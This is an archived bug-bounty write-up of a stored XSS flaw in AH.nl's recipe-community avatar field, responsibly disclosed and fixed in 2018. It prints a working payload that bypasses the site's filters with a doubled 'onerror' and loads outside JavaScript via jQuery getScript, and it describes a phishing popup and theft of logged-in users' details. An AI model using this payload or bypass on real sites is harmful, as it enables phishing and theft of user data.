---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-07-09_persistent-xss-at-ahnl.md
original_filename: 2018-07-09_persistent-xss-at-ahnl.md
title: Persistent XSS at AH.nl
category: documents
detected_topics:
- xss
- command-injection
- file-upload
- rate-limit
tags:
- imported
- documents
- xss
- command-injection
- file-upload
- rate-limit
language: en
raw_sha256: 9f5ec1682dd70ec3b8c1e87a6dd43262173018ddde4f9e5e643377a73952d18b
text_sha256: 4bbbb3f721bd3b7e6e34e9b688995e41dcfac6158ccb573f3b3e463191635f6f
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Persistent XSS at AH.nl

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-07-09_persistent-xss-at-ahnl.md
- Source Type: markdown
- Detected Topics: xss, command-injection, file-upload, rate-limit
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `9f5ec1682dd70ec3b8c1e87a6dd43262173018ddde4f9e5e643377a73952d18b`
- Text SHA256: `4bbbb3f721bd3b7e6e34e9b688995e41dcfac6158ccb573f3b3e463191635f6f`


## Content

---
title: "Persistent XSS at AH.nl"
url: "https://medium.com/@jonathanbouman/persistent-xss-at-ah-nl-198fe7b4c781"
authors: ["Jonathan Bouman (@JonathanBouman)"]
programs: ["AH.nl"]
bugs: ["Stored XSS"]
bounty: "200"
publication_date: "2018-07-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5813
scraped_via: "browseros"
---

# Persistent XSS at AH.nl

Top highlight

Persistent XSS at AH.nl
Jonathan Bouman
Follow
6 min read
·
Jul 9, 2018

467

3

Press enter or click to view image in full size
tl;dr: server stored xss visible to all visitors

Are you aware of any (private) bug bounty programs or platforms? I would love to get an invite. Please get in touch with me: Jonathan@Protozoan.nl

Background
In the previous blog posts we discussed Reflected XSS bugs at Amazon.com, Unauthorized file uploads at Apple.com and Open redirect bugs at Bol.com

These types of attacks need a user to click a specific link in order to run our malicious code. A problem with that is that most browsers block this sort of attacks.

But what if we want to inject our code into the website so every visiting user will be targeted? We call this type of attack Persistent- or Stored XSS. A big advantage is that browser can’t easily detect this type of attack, so we don’t have problems with bypassing the XSS auditors.

AH.nl
Today we will try to find this type of bug at Albert Heijn, the biggest supermarket chain in The Netherlands.

Searching for vulnerable pages
Persistent means that we have to save our code in the database of the website. This narrows our focus to places where we can register, sign up and create content. A quick look at AH.nl shows us a community website that offers the exchange of recipes, Kookschrift.

Everyone can register and after your first submission of a recipe someone at AH.nl will activate and publish your profile. Part of your profile is an avatar, you are allowed to pick one from a predefined list. After clicking the avatar a number will be saved into a hidden form field and it’s all fine.

Press enter or click to view image in full size
Avatar integer

But what if we try something else like… change the number to a string containing our javascript code?

Burp Suite to the rescue
An easy way to test different payloads is to use burpsuite. You start burpsuite and add it to your browser. From that moment it will intercept all your website requests. This allows you to easily modify parameters, submit new values and evaluate the responses.

Press enter or click to view image in full size
Intercepted profile edit

Use the action button and pick ‘Send to repeater’. After that press the repeater tab and let the magic happen.

Press enter or click to view image in full size

You are now able to set all sorts of payloads to the different fields, with the result of the submission on the right.

Now it’s time to submit your payload, refresh the browser and see if our code results in unexpected behavior. Think of not properly escaped strings, number parameters that are able to hold strings, url strings that are not checked against a whitelist, etc. You are able to automatically brute force this by using tools like burpsuite (attacker tab), but I advice you to do it manually. Otherwise you may trigger firewalls and cause unnecessary load on the website.

I save you some time here; almost all the parameters are properly sanitized, except one; the avatarUrl field on the profile edit page.

Perfect. That one is used in different places on the website and avatars are also visible on the frontpage; they’ve got a list of ‘New users’ with avatars. Now we only need to create the javascript payload to inject into our avatar field.

For this proof of concept it will be enough to arrange an account that is featured on the frontpage as a new user. We won’t use that user for our injection, but you can imagine the impact if we did.

Creating the XSS Payload
Before we start we need to take a look at how the HTML is structured.

Press enter or click to view image in full size
Avatar on the frontpage

As you can see the HTML is quite simple, just an image displaying the avatar.
What if we are able to inject a " in order to close the src= attribute and after that an onerror=ourJavascript() That will force the browser to load an image that does not exists and fires our onerror handler. Sounds good!

Get Jonathan Bouman’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Firewalls, regular expressions, string sanitizers
After a few hours of trying I discovered that quite a lot of combinations are blocked and I came up with the following working payload:
"%20onerror%20onerror%3d%3donerror%3da%3d$.getScript("https://na12.nl")%20data%3d"

We start with the “ to close the img src attribute, since it will give an error (the image that it tries to load does not exist) we can use the onerror handler to execute code.
Onerror/onload/onclick= strings are removed by their firewall, but we can bypass that by using a string like onerroronerror== it will remove the onerror= in the middle and we end up with… onerror=.
Now we need to load our code, luckily they include jQuery on every page, so we’re able to use the getScript function to load external javascript.
There are some regular expression in place on the AH.nl server that validate strings for urls. It will returns errors for situations where the url is too long or if it does contain a slash in the path. Because of that we need a short domain name and a server that sends our javascript if it receives a request on the ‘naked’ https://domain.com url.

External Javascript
We don’t have limitations in the code we inject if we are able load our external javascript. Below a copy of the code. We add some CSS to the page and inject a jQuery module that allows us to make a nice modal popup. Later we will use this to show our fake phishing login. As a bonus we will add a small script that tries to lookup the user details of any logged in user that loads our code.

Press enter or click to view image in full size
Source of our injected javascript

Get on the frontpage, hutspot
Now we want to target all the visitors that visit this part of the website. We need AH.nl to publish one of our accounts, so that means; write recipes!

Press enter or click to view image in full size
H. Acker on the frontpage

I signed up with an account, submitted one of my best hutspot recipes, took a cup of tea and waited for few hours. Welcome Hermelien Acker!

We have a dangerous combination now if we load our code into Hermelien her avatar. We won’t do that since we want to avoid impacting any regular visitors.

However the code still loads if we are logged in with a manipulated account (the avatar is displayed in the menu) so we can use that for our screen capture and bug submission.

Proof of concept in action

Press enter or click to view image in full size
Press enter or click to view image in full size
Logged in user? We’re able to steal their details. Also their last purchases if they connected their discount card.

Solutions

Always validate user input
Define a field as an integer in the database if it is an integer, don’t allow type mixing.
Escape all fields in the output HTML

Impact of the attack

Extra filtration of user information from other pages at AH.nl, submit data as the visitor on the AH.nl domain
Attack the browser of visitors through injection of a framework like beefproject.com
Setting up a phishing login

Timeline
14–06–18 Found the bug, informed AH.nl
15–06–18 Bug confirmed by AH.nl
19–06–18 Requested update
05–07–18 Requested update
06–07–18 Bug fixed by AH.nl
09-07–18 Blog published, €200 reward
